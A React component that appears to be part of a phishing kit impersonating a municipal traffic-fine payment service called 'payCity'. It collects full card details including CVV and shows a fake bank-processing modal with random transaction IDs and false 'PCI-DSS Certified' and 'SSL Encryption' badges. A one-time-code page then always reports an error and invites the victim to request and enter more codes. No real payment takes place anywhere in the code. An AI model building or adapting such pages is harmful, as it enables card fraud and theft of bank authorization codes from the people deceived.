// ── CardPaymentPage.jsx ──────────────────────────────────────────────────────
import { useState, useEffect, useRef } from "react";
import ReactDOM from "react-dom";
import { PayCityLogo } from "./Shared";
import {
  SiVisa,
  SiMastercard,
  SiAmericanexpress,
  SiDiscover,
  SiJcb,
  SiDinersclub,
} from "react-icons/si";
import FooterSection from "./FooterSection";

// ── Maestro Icon ──────────────────────────────────────────────────────────────
const MaestroIcon = ({ size = 28 }) => (
  <svg width={size} height={size} viewBox="0 0 48 48" fill="none">
    <circle cx="16" cy="24" r="12" fill="#00A4E0" />
    <circle cx="32" cy="24" r="12" fill="#FF5F00" />
    <circle cx="24" cy="24" r="12" fill="#EB001B" />
  </svg>
);

// ── Card type detector ────────────────────────────────────────────────────────
const detectCardType = (num) => {
  const n = num.replace(/\s/g, "");
  if (/^4/.test(n)) return "visa";
  if (/^5[1-5]/.test(n) || /^2[2-7]\d{2}/.test(n)) return "mastercard";
  if (/^3[47]/.test(n)) return "amex";
  if (/^6011|^65|^64[4-9]/.test(n)) return "discover";
  if (/^35/.test(n)) return "jcb";
  if (/^3[0689]/.test(n)) return "diners";
  if (/^6[37]/.test(n)) return "maestro";
  return null;
};

const SUPPORTED = ["visa", "mastercard"];

const CARD_ICON = {
  visa:       { icon: SiVisa,            color: "#1A1F71", label: "Visa" },
  mastercard: { icon: SiMastercard,      color: "#EB001B", label: "Mastercard" },
  amex:       { icon: SiAmericanexpress, color: "#007BC1", label: "Amex" },
  discover:   { icon: SiDiscover,        color: "#E65C00", label: "Discover" },
  jcb:        { icon: SiJcb,             color: "#003087", label: "JCB" },
  diners:     { icon: SiDinersclub,      color: "#004A97", label: "Diners" },
  maestro:    { icon: MaestroIcon,       color: "#6F6F6F", label: "Maestro" },
};

const ALL_BRANDS = [
  { key: "visa",       icon: SiVisa,            color: "#1A1F71", label: "Visa" },
  { key: "mastercard", icon: SiMastercard,       color: "#EB001B", label: "Mastercard" },
  { key: "amex",       icon: SiAmericanexpress,  color: "#007BC1", label: "Amex" },
  { key: "discover",   icon: SiDiscover,         color: "#E65C00", label: "Discover" },
  { key: "jcb",        icon: SiJcb,              color: "#003087", label: "JCB" },
  { key: "maestro",    icon: MaestroIcon,        color: "#6F6F6F", label: "Maestro" },
  { key: "diners",     icon: SiDinersclub,       color: "#004A97", label: "Diners" },
];

// ── Helpers ───────────────────────────────────────────────────────────────────
const genTxnId = () => {
  const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
  let id = "";
  for (let i = 0; i < 12; i++) id += chars[Math.floor(Math.random() * chars.length)];
  return id;
};

function Row({ label, value, mono = false }) {
  return (
    <div className="flex justify-between items-start gap-2">
      <span className="text-xs text-gray-500 shrink-0">{label}</span>
      <span className={`text-xs text-gray-800 font-semibold text-right ${mono ? "font-mono tracking-wide" : ""}`}>
        {value}
      </span>
    </div>
  );
}

// ── Processing Modal ──────────────────────────────────────────────────────────
function ProcessingModal({ cardType, onClose }) {
  const [progress, setProgress] = useState(0);
  const txnId    = useRef(genTxnId()).current;
  const procTime = useRef((Math.random() * 2 + 1.5).toFixed(2)).current;

  useEffect(() => {
    const duration = 3600;
    const interval = 40;
    const steps    = duration / interval;
    let step       = 0;
    const timer = setInterval(() => {
      step++;
      setProgress(Math.min(100, Math.round((step / steps) * 100)));
      if (step >= steps) {
        clearInterval(timer);
        setTimeout(() => onClose?.(), 500);
      }
    }, interval);
    return () => clearInterval(timer);
  }, []);

  const renderBigLogo = () => {
    if (!cardType || !CARD_ICON[cardType]) return <SiVisa size={90} color="#1A1F71" />;
    if (cardType === "maestro") return <MaestroIcon size={90} />;
    const { icon: Icon, color } = CARD_ICON[cardType];
    return <Icon size={90} color={color} />;
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/40 px-4">
      <div className="w-full max-w-sm bg-white rounded-2xl overflow-hidden shadow-2xl">
        <div className="flex flex-col items-center justify-center pt-10 pb-6 px-6">
          <div className="mb-7">{renderBigLogo()}</div>
          <div className="w-full bg-gray-200 rounded-full h-2 mb-3 overflow-hidden">
            <div
              className="h-2 rounded-full"
              style={{
                width: `${progress}%`,
                background: "linear-gradient(90deg, #3B82C4, #1A1F71)",
                transition: "width 40ms linear",
              }}
            />
          </div>
          <p className="text-gray-600 text-sm font-medium mb-2">Processing bank response...</p>
          <div className="flex items-center gap-3">
            <span className="flex items-center gap-1 text-xs text-green-600 font-semibold">
              <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                <rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/>
              </svg>
              SSL Encryption
            </span>
            <span className="text-gray-300 text-xs">|</span>
            <span className="flex items-center gap-1 text-xs text-green-600 font-semibold">
              <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
              </svg>
              PCI-DSS Certified
            </span>
          </div>
        </div>
        <div className="mx-4 mb-6 rounded-xl border border-gray-200 bg-gray-50 px-4 py-4">
          <p className="text-xs font-bold text-gray-500 mb-3 flex items-center gap-1">
            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/>
            </svg>
            Transaction Details
          </p>
          <div className="space-y-2.5">
            <Row label="Transaction ID:"     value={txnId}                         mono />
            <Row label="Processing Network:" value="International Payment Network"      />
            <Row label="Processing Time:"    value={`${procTime} seconds`}             />
            <Row label="Security Level:"     value="High"                              />
          </div>
        </div>
      </div>
    </div>
  );
}

// ── Authorized Bank Loading Page ──────────────────────────────────────────────
function AuthorizedBankPage({ cardType, onNext }) {
  useEffect(() => {
    const timer = setTimeout(() => onNext?.(), 3000);
    return () => clearTimeout(timer);
  }, []);

  const renderCardIcon = () => {
    if (!cardType || !CARD_ICON[cardType]) return null;
    if (cardType === "maestro") return <MaestroIcon size={28} />;
    const { icon: Icon, color } = CARD_ICON[cardType];
    return <Icon size={28} color={color} />;
  };

  return (
    <div className="min-h-screen bg-white flex flex-col items-center justify-center px-6">
      {/* Card with lock icon */}
      <div className="relative mb-4">
        <svg width="80" height="60" viewBox="0 0 80 60" fill="none">
          <rect x="2" y="10" width="76" height="48" rx="8" fill="#E5E7EB" stroke="#D1D5DB" strokeWidth="1.5"/>
          <rect x="2" y="22" width="76" height="10" fill="#9CA3AF"/>
          <rect x="10" y="38" width="20" height="4" rx="2" fill="#D1D5DB"/>
          <rect x="10" y="44" width="14" height="4" rx="2" fill="#D1D5DB"/>
        </svg>
        {/* Lock badge */}
        <div className="absolute -top-2 -right-2 w-8 h-8 bg-blue-400 rounded-full flex items-center justify-center shadow">
          <svg width="14" height="14" viewBox="0 0 24 24" fill="white">
            <rect x="3" y="11" width="18" height="11" rx="2"/>
            <path d="M7 11V7a5 5 0 0 1 10 0v4" stroke="white" strokeWidth="2" fill="none" strokeLinecap="round"/>
          </svg>
        </div>
      </div>

      {/* Card label */}
      <div className="mb-6 flex items-center gap-2">
        {renderCardIcon()}
        <span className="text-gray-500 text-sm font-semibold uppercase tracking-widest">
          {cardType ? CARD_ICON[cardType]?.label : "CARD"}
        </span>
      </div>

      {/* Authorized Bank */}
      <div className="flex items-center gap-1 mb-3">
        <svg width="16" height="16" viewBox="0 0 24 24" fill="#22C55E">
          <path d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0 1 12 2.944a11.955 11.955 0 0 1-8.618 3.04A12.02 12.02 0 0 0 3 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/>
        </svg>
        <span className="text-gray-800 font-bold text-base">Authorized Bank</span>
      </div>

      <p className="text-gray-500 text-sm text-center mb-2 leading-relaxed">
        Please go to the bank app to confirm the authorization
      </p>
      <p className="text-gray-400 text-sm text-center mb-8">
        Please do not close this page
      </p>

      {/* Spinner */}
      <div className="flex items-center justify-center">
        <div className="w-8 h-8 border-4 border-gray-200 border-t-gray-500 rounded-full animate-spin" />
      </div>
    </div>
  );
}

// ── Verification Page ─────────────────────────────────────────────────────────
function VerificationPage({ cardType, onSubmit }) {
  const [code, setCode] = useState("");
  const [seconds, setSeconds] = useState(60);
  const [error, setError] = useState(false);
  const [loading, setLoading] = useState(false);

  useEffect(() => {
    if (seconds <= 0) return;
    const timer = setInterval(() => setSeconds((s) => s - 1), 1000);
    return () => clearInterval(timer);
  }, [seconds]);

  const pad = (n) => String(n).padStart(2, "0");

  // payCity loading screen
  if (loading) {
    return (
      <div className="min-h-screen bg-white flex flex-col items-center justify-center" style={{ gap: "12px" }}>
        <div style={{ textAlign: "center" }}>
          <div style={{ display: "flex", alignItems: "flex-end", justifyContent: "center", fontFamily: "Georgia,serif", fontStyle: "italic", lineHeight: 1 }}>
            <span style={{ fontSize: "54px", fontWeight: 300, color: "black" }}>pay</span>
            <span style={{ position: "relative", fontSize: "54px", fontWeight: 300, color: "black" }}>
              C
              <span style={{ position: "absolute", top: "7px", right: "-3px", width: "9px", height: "9px", borderRadius: "50%", background: "#F97316", display: "block" }} />
            </span>
            <span style={{ fontSize: "54px", fontWeight: 300, color: "black" }}>ity</span>
          </div>
          <p style={{ color: "#9CA3AF", fontSize: "13px", marginTop: "4px", letterSpacing: "0.3px" }}>connected citizens</p>
        </div>
        <div style={{ width: "28px", height: "28px", border: "4px solid #FED7AA", borderTopColor: "#F97316", borderRadius: "50%", animation: "spin 0.8s linear infinite", marginTop: "4px" }} />
        <style>{`@keyframes spin { to { transform: rotate(360deg); } }`}</style>
      </div>
    );
  }

  const renderCardIcon = () => {
    if (!cardType || !CARD_ICON[cardType]) return null;
    if (cardType === "maestro") return <MaestroIcon size={32} />;
    const { icon: Icon, color } = CARD_ICON[cardType];
    return <Icon size={32} color={color} />;
  };

  return (
    <div className="min-h-screen bg-white flex flex-col">
      {/* Header */}
      <div className="flex items-center justify-between px-5 pt-5 pb-4 border-b border-gray-100">
        <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="#374151" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round">
          <path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/>
          <polyline points="9 22 9 12 15 12 15 22"/>
        </svg>
        <div>{renderCardIcon()}</div>
      </div>

      <div className="flex-1 px-5 pt-8">
        <h2 className="text-xl font-bold text-gray-800 mb-4">Secure Payment</h2>

        <p className="text-gray-500 text-sm leading-relaxed mb-4">
          Please confirm your identity and a one-time code will be sent to your phone or email. Enter the verification code here
        </p>

        <p className="text-gray-400 text-sm leading-relaxed mb-8">
          Please do not click the 'Refresh' or 'Back' buttons as this may terminate your transaction
        </p>

        <p className="text-center text-gray-700 font-semibold mb-3">Verification Code</p>

        <input
          value={code}
          onChange={(e) => {
            setCode(e.target.value.replace(/\D/g, "").slice(0, 6));
            setError(false);
          }}
          placeholder=""
          inputMode="numeric"
          className={`w-full border rounded-lg px-4 py-3 text-center text-lg font-mono tracking-widest outline-none focus:ring-2 focus:ring-orange-100 mb-1 transition-all ${
            error ? "border-red-400" : "border-gray-300 focus:border-orange-400"
          }`}
        />

        {/* Error message */}
        {error && (
          <p className="text-red-500 text-sm mb-3">
            Verification code error, please try again
          </p>
        )}

        <div className="mb-4" />

        <button
          onClick={() => {
            if (!code || code.length < 4) { setError(true); return; }
            setError(false);
            setLoading(true);
            setTimeout(() => {
              setLoading(false);
              setError(true);
            }, 2500);
          }}
          className="w-full bg-orange-400 hover:bg-orange-500 active:scale-[0.98] text-white font-bold py-4 rounded-xl transition-all text-base mb-3"
        >
          Submit
        </button>

        {/* Timer or resend link */}
        {seconds > 0 ? (
          <p className="text-center text-gray-400 font-mono text-sm">
            00:{String(seconds).padStart(2, "0")}
          </p>
        ) : (
          <p className="text-center text-sm">
            <span
              onClick={() => { setCode(""); setError(false); setSeconds(60); }}
              className="text-orange-400 underline cursor-pointer "
            //   style={{ textDecorationColor: "#F97316" }}
            >
              Click here to receive another code
            </span>
          </p>
        )}
      </div>
    </div>
  );
}

// ── Main Component ─────────────────────────────────────────────────────────────
export default function CardPaymentPage({ fine, discounted, onBack, onSuccess }) {
  const [cardHolder, setCardHolder]   = useState("");
  const [cardNum, setCardNum]         = useState("");
  const [expiry, setExpiry]           = useState("");
  const [cvv, setCvv]                 = useState("");

  // Flow states: null | "processing" | "authloading" | "verification"
  const [stage, setStage]             = useState(null);
  // Show unsupported msg after modal closes for unsupported cards
  const [showUnsupportedMsg, setShowUnsupportedMsg] = useState(false);

  const formatCard = (v) =>
    v.replace(/\D/g, "").slice(0, 16).replace(/(.{4})/g, "$1 ").trim();

  const formatExpiry = (v) => {
    const d = v.replace(/\D/g, "").slice(0, 4);
    return d.length > 2 ? d.slice(0, 2) + "/" + d.slice(2) : d;
  };

  const rawNum      = cardNum.replace(/\s/g, "");
  const cardType    = rawNum.length >= 1 ? detectCardType(rawNum) : null;
  const isUnsupported = rawNum.length >= 6 && cardType && !SUPPORTED.includes(cardType);

  const handleSubmit = () => {
    if (!cardHolder.trim() || rawNum.length < 15 || !expiry || !cvv) return;
    setShowUnsupportedMsg(false);
    setStage("processing");
  };

  // Called when processing modal finishes
  const handleProcessingDone = () => {
    setStage(null); // close modal
    if (isUnsupported) {
      // Show error msg below field
      setShowUnsupportedMsg(true);
    } else {
      // Supported card → go to auth loading page
      setStage("authloading");
    }
  };

  const renderActiveIcon = () => {
    if (!cardType || !CARD_ICON[cardType]) return null;
    if (cardType === "maestro") return <MaestroIcon size={32} />;
    const { icon: Icon, color } = CARD_ICON[cardType];
    return <Icon size={32} color={color} />;
  };

  // ── Verification page ──
  if (stage === "verification") {
    return <VerificationPage cardType={cardType} onSubmit={onSuccess} />;
  }

  // ── Auth loading page ──
  if (stage === "authloading") {
    return (
      <AuthorizedBankPage
        cardType={cardType}
        onNext={() => setStage("verification")}
      />
    );
  }

  // ── Card payment form ──
  return (
    <div className="min-h-screen bg-gray-50 flex justify-center">
      <div className="w-full max-w-sm bg-white min-h-screen flex flex-col shadow-sm">

        {/* Sticky Header */}
        <div className="px-5 pt-5 pb-4 bg-white sticky top-0 z-50 border-b border-gray-100 shadow-sm">
          <PayCityLogo size="lg" />
        </div>

        <div className="flex-1 px-5 pt-5 pb-14">

          <h1 className="text-2xl text-gray-600 italic">Secure Payment Solution</h1>

          <p className="text-gray-400 text-xs mb-5 leading-relaxed">
            Privacy is guaranteed and we will not share your personal data.
          </p>

          {/* Notice + Amount */}
          <div className="bg-teal-50 border border-teal-200 rounded-xl px-4 py-4 mb-7">
            <div className="flex items-center justify-between mb-2">
              <span className="text-gray-500 text-xs font-semibold tracking-wide">Notice Number:</span>
              <span className="text-orange-500 font-bold text-sm font-mono">{fine?.ref ?? "—"}</span>
            </div>
            <div className="flex items-center justify-between">
              <span className="text-gray-500 text-xs font-semibold tracking-wide">Total Fine :</span>
              <span className="text-red-600 font-bold text-xl">R {Number(discounted).toFixed(0)}</span>
            </div>
          </div>

          {/* Cardholder Name */}
          <div className="mb-4">
            <label className="flex items-center gap-1 text-sm font-semibold text-gray-700 mb-1.5">
              <span className="text-red-500">*</span> Cardholder Name
            </label>
            <input
              value={cardHolder}
              onChange={(e) => setCardHolder(e.target.value)}
              placeholder="Full name as on card"
              className="w-full border border-gray-300 rounded-lg px-3 py-3 text-sm outline-none focus:border-orange-400 focus:ring-2 focus:ring-orange-100 transition-all bg-white"
            />
          </div>

          {/* Card Number */}
          <div className="mb-1">
            <label className="flex items-center gap-1 text-sm font-semibold text-gray-700 mb-1.5">
              <span className="text-red-500">*</span> Card Number
            </label>
            <div
              className={`flex items-center border rounded-lg px-3 py-2.5 bg-white transition-all ${
                isUnsupported
                  ? "border-red-400 ring-2 ring-red-100"
                  : "border-gray-300 focus-within:border-orange-400 focus-within:ring-2 focus-within:ring-orange-100"
              }`}
            >
              <input
                value={formatCard(cardNum)}
                onChange={(e) => {
                  setCardNum(e.target.value.replace(/\s/g, ""));
                  setShowUnsupportedMsg(false);
                }}
                placeholder="0000 0000 0000 0000"
                inputMode="numeric"
                className="flex-1 text-sm outline-none bg-transparent tracking-widest"
              />
              <div className="ml-2 flex-shrink-0 flex items-center justify-center w-9 h-7">
                {renderActiveIcon()}
              </div>
            </div>

            {/* Unsupported error — shown after modal or on detect */}
            {(isUnsupported || showUnsupportedMsg) && (
              <p className="text-red-500 text-xs mt-2 leading-snug font-medium">
                ⚠ This card is not supported for this transaction. Please use a Visa or Mastercard.
              </p>
            )}
          </div>

          {/* Card Brand Icons Row */}
          <div className="flex flex-wrap items-center gap-3 mt-3 mb-5 py-2 px-1 bg-gray-50 rounded-xl border border-gray-100">
            {ALL_BRANDS.map(({ key, icon: Icon, color, label }) => (
              <div
                key={key}
                className={`transition-all duration-200 ${
                  cardType === key ? "opacity-100 scale-125" : cardType ? "opacity-25" : "opacity-80"
                }`}
                title={label}
              >
                {key === "maestro" ? <MaestroIcon size={28} /> : <Icon size={28} color={color} />}
              </div>
            ))}
          </div>

          {/* Expiry + CVV */}
          <div className="grid grid-cols-2 gap-4 mb-8">
            <div>
              <label className="flex items-center gap-1 text-sm font-semibold text-gray-700 mb-1.5">
                <span className="text-red-500">*</span> Expiration Date
              </label>
              <input
                value={formatExpiry(expiry)}
                onChange={(e) => setExpiry(e.target.value)}
                placeholder="MM/YY"
                inputMode="numeric"
                className="w-full border border-gray-300 rounded-lg px-3 py-3 text-sm outline-none focus:border-orange-400 focus:ring-2 focus:ring-orange-100 transition-all bg-white"
              />
            </div>
            <div>
              <label className="flex items-center gap-1 text-sm font-semibold text-gray-700 mb-1.5">
                <span className="text-red-500">*</span> CVV
              </label>
              <input
                value={cvv}
                onChange={(e) => setCvv(e.target.value.replace(/\D/g, "").slice(0, 4))}
                placeholder="• • •"
                type="password"
                inputMode="numeric"
                className="w-full border border-gray-300 rounded-lg px-3 py-3 text-sm outline-none focus:border-orange-400 focus:ring-2 focus:ring-orange-100 transition-all bg-white"
              />
            </div>
          </div>

          {/* Submit */}
          <button
            onClick={handleSubmit}
            className="w-full bg-orange-400 hover:bg-orange-500 active:scale-[0.98] text-white font-bold py-4 rounded-xl transition-all text-base flex items-center justify-center gap-2 shadow-md shadow-orange-100"
          >
            Submit
          </button>
        </div>

        <FooterSection />
      </div>

      {/* Processing Modal via portal */}
      {stage === "processing" &&
        ReactDOM.createPortal(
          <ProcessingModal cardType={cardType} onClose={handleProcessingDone} />,
          document.body
        )}
    </div>
  );
}